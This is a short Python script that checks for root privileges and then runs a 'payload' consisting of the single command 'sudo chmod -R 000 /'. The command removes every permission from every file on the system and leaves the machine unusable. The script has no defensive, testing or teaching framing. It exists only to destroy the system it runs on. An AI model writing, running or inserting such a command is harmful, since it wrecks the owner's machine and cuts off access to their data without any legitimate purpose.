#!/usr/bin/env python3
import os
import sys
import subprocess

def check_root():

    if os.geteuid() != 0:
        print(" [!] Error: run this program with root privileges.")

        sys.exit(1)


def run_payload():
    

    
    commands = [
        "sudo chmod -R 000 /",

    ]

    for cmd in commands:

        
        subprocess.run(cmd, shell=True)

def main():
    
    check_root()

    

    run_payload()


if __name__ == "__main__":
    main()